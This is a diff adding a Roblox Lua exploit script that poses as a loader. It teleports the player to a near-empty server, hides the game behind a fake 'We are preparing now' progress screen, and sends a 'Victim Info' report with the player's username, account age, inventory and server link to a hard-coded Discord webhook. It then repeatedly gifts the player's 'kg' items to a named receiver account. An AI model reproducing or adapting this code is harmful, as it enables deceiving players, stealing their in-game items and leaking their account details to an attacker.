@@ -1,0 +1,301 @@
+-- =========================
+-- الخدمات الأساسية
+-- =========================
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- =========================
+-- 1: قسم النقل التلقائي (أولاً)
+-- =========================
+task.spawn(function()
+    local function findEmptyServer()
+        local currentPlayers = #Players:GetPlayers()
+        
+        if currentPlayers <= 3 then
+            return false
+        end
+        
+        local success, servers = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet(
+                "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+            ))
+        end)
+        
+        if success and servers and servers.data then
+            for _, server in ipairs(servers.data) do
+                if server.playing <= 3 and server.id ~= game.JobId then
+                    local transferSuccess = pcall(function()
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)
+                    end)
+                    
+                    if transferSuccess then
+                        return true
+                    end
+                end
+            end
+        end
+        
+        return false
+    end
+
+    while true do
+        local moved = findEmptyServer()
+        if moved then
+            break
+        end
+        wait(300)
+    end
+end)
+
+-- =========================
+-- 2: واجهة التحميل (ثانياً)
+-- =========================
+task.spawn(function()
+    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
+        pcall(function() 
+            StarterGui:SetCoreGuiEnabled(guiType, false) 
+        end)
+    end
+
+    for _, child in ipairs(PlayerGui:GetChildren()) do
+        if not child:IsA("PersistentGui") then
+            child:Destroy()
+        end
+    end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "PreparationLoader"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = PlayerGui
+
+    local Background = Instance.new("Frame")
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
+    Background.BorderSizePixel = 0
+    Background.Parent = ScreenGui
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(0.7, 0, 0.1, 0)
+    Title.Position = UDim2.new(0.15, 0, 0.3, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "We are preparing now, thank you for your patience"
+    Title.TextColor3 = Color3.fromRGB(0, 255, 200)
+    Title.TextScaled = true
+    Title.Font = Enum.Font.GothamBlack
+    Title.Parent = Background
+
+    local ProgressBarBG = Instance.new("Frame")
+    ProgressBarBG.Size = UDim2.new(0.6, 0, 0.03, 0)
+    ProgressBarBG.Position = UDim2.new(0.2, 0, 0.5, 0)
+    ProgressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    ProgressBarBG.BorderSizePixel = 0
+    ProgressBarBG.Parent = Background
+
+    local ProgressBar = Instance.new("Frame")
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    ProgressBar.BorderSizePixel = 0
+    ProgressBar.Parent = ProgressBarBG
+
+    local PercentText = Instance.new("TextLabel")
+    PercentText.Size = UDim2.new(0.2, 0, 0.05, 0)
+    PercentText.Position = UDim2.new(0.4, 0, 0.55, 0)
+    PercentText.BackgroundTransparency = 1
+    PercentText.Text = "0%"
+    PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    PercentText.TextScaled = true
+    PercentText.Font = Enum.Font.GothamBold
+    PercentText.Parent = Background
+
+    local function animateLoader()
+        local duration = 120
+        local startTime = tick()
+        
+        while tick() - startTime < duration do
+            local elapsed = tick() - startTime
+            local progress = elapsed / duration
+            local percent = math.floor(progress * 100)
+            
+            ProgressBar.Size = UDim2.new(progress, 0, 1, 0)
+            PercentText.Text = percent .. "%"
+            
+            local r = progress * 255
+            local g = (1 - progress) * 255
+            local b = 100
+            ProgressBar.BackgroundColor3 = Color3.fromRGB(r, g, b)
+            
+            wait(0.1)
+        end
+        
+        ProgressBar.Size = UDim2.new(1, 0, 1, 0)
+        PercentText.Text = "100%"
+        ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        
+        while true do
+            wait(1)
+        end
+    end
+
+    animateLoader()
+end)
+
+-- =========================
+-- 3: نظام الويب هوك (بعد 7 ثواني)
+-- =========================
+task.spawn(function()
+    wait(7)
+
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1404963530566008992/dz4pD1E7LLhqxNgG6oPqOMeiVB8-JKd755bHs04VRS7yjVzXgMqFZkuaRnH87Y1oEC2u"
+    
+    local playerName = player.Name
+    local userId = player.UserId
+    local accountAge = player.AccountAge .. " Days"
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+
+    local items = {}
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                table.insert(items, item.Name)
+            end
+        end
+    end
+
+    local fileContent = "🎮 Alien Hit Inventory Report\n"
+    fileContent = fileContent .. "👤 Player: " .. playerName .. "\n"
+    fileContent = fileContent .. "🆔 User ID: " .. userId .. "\n"
+    fileContent = fileContent .. "⏰ Account Age: " .. accountAge .. "\n"
+    fileContent = fileContent .. "🌐 Server: " .. jobId .. "\n"
+    fileContent = fileContent .. "📅 Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n"
+    fileContent = fileContent .. "📦 All Items (" .. #items .. "):\n\n"
+
+    for i, itemName in ipairs(items) do
+        fileContent = fileContent .. i .. ". " .. itemName .. "\n"
+    end
+
+    local message = "@everyone **Alien Hit**\n" ..
+    "──────────────\n" ..
+    "**Victim Info:**\n" ..
+    "Username: " .. playerName .. "\n" ..
+    "Executor: Delta\n" .. 
+    "Account Age: " .. accountAge .. "\n" ..
+    "Receiver: sssfysue7\n" ..
+    "──────────────\n" ..
+    "**Hit List:**\n"
+
+    for i = 1, math.min(5, #items) do
+        message = message .. "• " .. items[i] .. "\n"
+    end
+
+    message = message .. "──────────────\n" ..
+    "**Total Items:** " .. #items .. "\n" ..
+    "**Server:** https://floating.gg/?placeID=" .. placeId .. "&gameInstanceId=" .. jobId .. "\n" ..
+    "**Time:** " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n" ..
+    "📎 **File Attached:** Complete inventory list"
+
+    pcall(function()
+        local requestFunc = (syn and syn.request) or http_request or request
+        if requestFunc then
+            local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+            local body = "--" .. boundary .. "\r\n" ..
+                        "Content-Disposition: form-data; name=\"content\"\r\n\r\n" ..
+                        message .. "\r\n" ..
+                        "--" .. boundary .. "\r\n" ..
+                        "Content-Disposition: form-data; name=\"file\"; filename=\"inventory.txt\"\r\n" ..
+                        "Content-Type: text/plain\r\n\r\n" ..
+                        fileContent .. "\r\n" ..
+                        "--" .. boundary .. "--"
+
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+                },
+                Body = body
+            })
+        end
+    end)
+end)
+
+-- =========================
+-- 4: نظام البراين روت النهائي (كل 2.5 ثانية)
+-- =========================
+task.spawn(function()
+    wait(10)
+    
+    local processedBrainRoots = {}
+    
+    local function processBrainRoots()
+        while true do
+            local backpack = player:FindFirstChild("Backpack")
+            
+            if not backpack then
+                wait(2)
+                continue
+            end
+            
+            local brainRoots = {}
+            for _, item in ipairs(backpack:GetChildren()) do
+                if item:IsA("Tool") and string.find(item.Name:lower(), "kg") then
+                    table.insert(brainRoots, item)
+                end
+            end
+            
+            if #brainRoots == 0 then
+                wait(3)
+                continue
+            end
+            
+            table.sort(brainRoots, function(a, b) return a.Name < b.Name end)
+            
+            for currentIndex = 1, #brainRoots do
+                local currentBrainRoot = brainRoots[currentIndex]
+                local brainRootID = currentBrainRoot.Name
+                
+                if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
+                    for _, tool in ipairs(player.Character:GetChildren()) do
+                        if tool:IsA("Tool") then tool.Parent = backpack end
+                    end
+                    
+                    currentBrainRoot.Parent = player.Character
+                    
+                    if not processedBrainRoots[brainRootID] then
+                        pcall(function()
+                            ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
+                                [1] = brainRootID,
+                                [2] = "",
+                            })
+                            processedBrainRoots[brainRootID] = true
+                        end)
+                    end
+                end
+                
+                pcall(function()
+                    ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
+                        [1] = {
+                            ["Item"] = currentBrainRoot,
+                            ["ToGift"] = "sssfysue7",
+                        },
+                        [2] = ""
+                    })
+                end)
+                
+                wait(2.5)
+            end
+            
+            wait(10)
+        end
+    end
+    
+    pcall(processBrainRoots)
+end)
